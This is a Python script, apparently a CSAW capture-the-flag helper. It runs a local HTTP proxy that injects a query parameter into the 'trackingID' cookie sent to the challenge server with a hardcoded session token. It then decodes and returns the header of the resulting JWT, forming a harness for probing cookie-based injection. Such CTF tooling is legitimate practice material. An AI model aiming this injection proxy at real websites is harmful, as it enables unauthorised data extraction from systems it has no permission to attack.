from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
import requests
import base64
import json
import jwt

url = "http://web.csaw.io:5800/"


class MyHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_url = urlparse(self.path)
        query_params = parse_qs(parsed_url.query)

        # Check if 'input' parameter is present
        if 'input' in query_params:
            input_value = query_params['input'][0]
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            cookies = {
                'session': 'eyJlbWFpbCI6IkVycm9yIiwidHJhY2tpbmdJRCI6bnVsbH0.ZQVrrw.meSJTe5WFfu09V_PPoaiolAD3PQ',
                'trackingID': f"{input_value}"
            }
            response = requests.get(url, cookies=cookies)
            cookies = response.cookies
            jwt_cookie = cookies.get('session')
            if jwt_cookie:
                jwt_parts = jwt_cookie.split('.')
                if len(jwt_parts) >= 2:
                    header_bytes = base64.urlsafe_b64decode(
                        jwt_parts[0] + '==')
                    header = json.loads(header_bytes.decode('utf-8'))
            self.wfile.write(f'{header}'.encode('utf-8'))
        else:
            self.send_response(400)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'Missing "input" parameter')


def run(server_class=HTTPServer, handler_class=MyHandler, port=8000):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f'Starting server on port {port}...')
    httpd.serve_forever()


if __name__ == '__main__':
    run()
